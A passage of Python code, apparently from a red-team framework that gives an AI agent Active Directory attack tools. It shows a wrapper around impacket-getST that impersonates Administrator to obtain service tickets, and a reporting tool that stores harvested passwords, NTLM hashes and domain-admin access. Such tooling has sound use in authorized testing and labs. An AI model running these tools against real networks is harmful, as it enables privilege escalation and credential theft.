            computer_password: Computer password
            target_spn: Target SPN (e.g., 'cifs/dc01.sevenkingdoms.local')
            impersonate_user: User to impersonate ('Administrator')
            dc_ip: Domain controller IP

        Returns:
            Service ticket saved as .ccache - use with KRB5CCNAME

        Example:
            >>> get_st("sevenkingdoms.local", "EVILPC$", "P@ss!", "cifs/dc01.sevenkingdoms.local", "Administrator", "192.168.56.10")
        """
        cmd = [
            "impacket-getST",
            "-spn",
            target_spn,
            "-impersonate",
            impersonate_user,
            "-dc-ip",
            dc_ip,
            f"{domain}/{computer_name}:{computer_password}",
        ]

        try:
            logger.info(f"[*] Requesting ST for {target_spn} as {impersonate_user}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)

            if ".ccache" in result.stdout:
                logger.info("[+] Ticket obtained! Export KRB5CCNAME and use secretsdump -k")

            return result.stdout
        except subprocess.TimeoutExpired:
            return "Service ticket request timed out"
        except Exception as e:
            return f"Service ticket request failed: {e}"


class RedTeamReportingTools(Toolset):
    """Tools for recording findings and building the operation report."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def record_finding(
        self,
        finding_type: str,
        data: dict[str, Any],
    ) -> str:
        """
        Record a discovery during the red team operation.

        Use this tool to report EVERY significant finding:
        - Users discovered
        - Credentials (username:password pairs)
        - NTLM hashes
        - Kerberos hashes
        - Network shares
        - Cracked passwords
        - Administrative access (Pwn3d!)
        - Domain admin discovery
        - Golden ticket success

        Args:
            finding_type: Type of finding - one of:
                "host", "user", "credential", "hash", "share",
                "admin_access", "domain_admin", "golden_ticket"
            data: Dictionary containing the finding data. Required fields per type:
                - host: {"ip": str, "hostname": str, "os": str, "roles": list, "services": list}
                - user: {"username": str, "domain": str, "description": str, "is_admin": bool}
                - credential: {"username": str, "password": str, "domain": str, "source": str, "is_admin": bool}
                - hash: {"username": str, "hash_value": str, "hash_type": str, "domain": str, "cracked_password": str}
                - share: {"host": str, "name": str, "permissions": str, "comment": str}
                - admin_access: {"details": str}

        Returns:
            Confirmation message

        Example:
            >>> record_finding("credential", {
            ...     "username": "administrator",
            ...     "password": "P@ssw0rd",
            ...     "domain": "EXAMPLE",
            ...     "source": "secretsdump",
            ...     "is_admin": True
            ... })
            >>> record_finding("hash", {
            ...     "username": "Administrator",
            ...     "hash_value": "aad3b435b51404ee...",
            ...     "hash_type": "NTLM",
            ...     "domain": "EXAMPLE"
            ... })
            >>> record_finding("share", {
            ...     "host": "192.168.1.100",
            ...     "name": "SYSVOL",
            ...     "permissions": "READ",
            ...     "comment": "Logon server share"
            ... })
        """
        if not self.state:
            return "[!] Error: No operation state available"

        try:
            if finding_type == "host":
                host = Host(
                    ip=data["ip"],
                    hostname=data.get("hostname", "Unknown"),
                    os=data.get("os", "Unknown"),
                    roles=data.get(
                        "roles", data.get("host_type", "").split() if data.get("host_type") else []
                    ),
                    services=data.get("services", []),
                )
                self.state.hosts.append(host)
                logger.info(f"[+] Recorded host: {host.hostname} ({host.ip})")
                return f"✓ Recorded host: {host.hostname} ({host.ip})"

            if finding_type == "user":
                user = User(
                    username=data["username"],
                    domain=data.get("domain", ""),
                    description=data.get("description", ""),
                    is_admin=data.get("is_admin", False),
                )
                self.state.users.append(user)
                logger.info(f"[+] Recorded user: {user.username}@{user.domain}")
                return f"✓ Recorded user: {user.username}@{user.domain}"

            if finding_type == "credential":
                cred = Credential(
                    username=data.get("username", "Unknown"),
                    password=data.get("password", ""),
                    domain=data.get("domain", ""),
                    source=data.get("source", "unknown"),
                    is_admin=data.get("is_admin", False),
                )
                self.state.credentials.append(cred)

                # Track tested credentials
                cred_key = self.state.get_credential_key(cred.username, cred.password, cred.domain)
                self.state.tested_credentials.add(cred_key)

                logger.info(f"[+] Recorded credential: {cred.username}@{cred.domain}")
                return f"✓ Recorded credential: {cred.username}@{cred.domain}"

            if finding_type == "hash":
                hash_obj = Hash(
                    username=data.get("username", "Unknown"),
                    hash_value=data["hash_value"],
                    hash_type=data.get("hash_type", "NTLM"),
                    domain=data.get("domain", ""),
                    cracked_password=data.get("cracked_password", ""),
                )
                self.state.hashes.append(hash_obj)
                logger.info(f"[+] Recorded hash for: {hash_obj.username}")
                return f"✓ Recorded hash for: {hash_obj.username}"

            if finding_type == "share":
                share = Share(
                    host=data.get("host_ip", data.get("host", "")),
                    name=data.get("share_name", data.get("name", "")),
                    permissions=data.get("permissions", ""),
                    comment=data.get("comment", data.get("description", "")),
                )
                self.state.shares.append(share)
                logger.info(f"[+] Recorded share: {share.name} on {share.host}")
                return f"✓ Recorded share: {share.name} on {share.host}"

            if finding_type == "admin_access":
                self.state.has_domain_admin = True
                event = TimelineEvent(
                    id=f"evt-{len(self.state.timeline):04d}",
                    timestamp=datetime.now(timezone.utc),
                    description=f"Domain admin access achieved: {data.get('details', '')}",
                    mitre_techniques=["T1078.002"],  # Domain Accounts
                    confidence=1.0,
                    source="domain_admin_checker",
                )
                self.state.timeline.append(event)
                logger.info("[+] CRITICAL: Domain admin access recorded!")
                return "✓ CRITICAL: Domain admin access recorded!"

            return f"[!] Unknown finding type: {finding_type}"

        except Exception as e:
            logger.error(f"[!] Error recording finding: {e}")
            return f"[!] Error recording finding: {e}"
